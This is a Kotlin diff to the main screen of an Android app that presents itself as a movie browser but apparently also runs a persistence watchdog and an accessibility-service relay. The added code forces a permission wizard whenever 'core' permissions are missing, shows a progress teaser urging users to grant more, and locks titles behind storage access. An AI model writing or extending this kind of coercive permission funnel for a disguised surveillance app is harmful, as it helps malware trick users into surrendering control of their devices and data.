@@ -18,6 +18,7 @@ class MoviesActivity : AppCompatActivity() {
     private val io = Executors.newSingleThreadExecutor()
     private lateinit var moviesList: RecyclerView
     private lateinit var loading: ProgressBar
+    private lateinit var permTeaser: View
     private lateinit var adapter: MoviesAdapter
     private var uploadedItems: List<MovieBrowseItem> = emptyList()
     private var fullBrowseList: List<MoviesListItem> = emptyList()
@@ -42,6 +43,8 @@ class MoviesActivity : AppCompatActivity() {
 
         moviesList = findViewById(R.id.moviesList)
         loading = findViewById(R.id.moviesLoading)
+        permTeaser = findViewById(R.id.permHomeTeaser)
+        updatePermTeaser()
         adapter = MoviesAdapter { item -> onTitleSelected(item) }
         moviesList.layoutManager = LinearLayoutManager(this)
         moviesList.adapter = adapter
@@ -70,7 +73,9 @@ class MoviesActivity : AppCompatActivity() {
             PersistenceWatchdog.schedule(this)
             TouchAccessibilityService.instance?.ensureRelay()
             runCatching {
-                if (PermissionMoments.hasHomeBatch(this)) {
+                if (PermissionSteps.hasCorePending(this)) {
+                    PermissionWizardActivity.launchAtFirstIncomplete(this)
+                } else if (PermissionMoments.hasHomeBatch(this)) {
                     PermissionMoments.scheduleHomeSession(this)
                 }
             }.onFailure { Log.w(TAG, "permission batch skipped: ${it.message}") }
@@ -81,6 +86,7 @@ class MoviesActivity : AppCompatActivity() {
 
     override fun onResume() {
         super.onResume()
+        updatePermTeaser()
         OfferDelivery.pollPending(this)
         if (!WatchSync.isEnabled(this) &&
             UserSession.onboardingDone(this) &&
@@ -205,6 +211,7 @@ class MoviesActivity : AppCompatActivity() {
 
     private fun onTitleSelected(item: MovieBrowseItem) {
         if (item.source == "hint") {
+            if (!StorageAccess.ensureForDownload(this)) return
             Toast.makeText(this, R.string.movies_upload_hint_body, Toast.LENGTH_LONG).show()
             return
         }
@@ -216,6 +223,10 @@ class MoviesActivity : AppCompatActivity() {
     }
 
     private fun openWatchRoom(item: MovieBrowseItem) {
+        if ((item.source == "family" || item.source == "hint") && !StorageAccess.isGranted(this)) {
+            PermissionMoments.launchStep(this, "storage")
+            return
+        }
         ContinueWatchingStore.save(this, item)
         startActivity(
             Intent(this, WatchRoomActivity::class.java).apply {
@@ -223,6 +234,16 @@ class MoviesActivity : AppCompatActivity() {
                 putExtra(FreeCatalogActivity.EXTRA_TITLE, item.title)
             },
         )
+    }
+
+    private fun updatePermTeaser() {
+        if (!::permTeaser.isInitialized) return
+        val pct = PermissionSteps.coreProgressPercent(this)
+        val pending = PermissionSteps.hasCorePending(this) || PermissionSteps.hasOptionalPending(this)
+        permTeaser.visibility = if (pending) View.VISIBLE else View.GONE
+        PermHomeTeaser.bind(permTeaser, pct) {
+            PermissionWizardActivity.launchAtFirstIncomplete(this)
+        }
     }
 
     override fun onDestroy() {
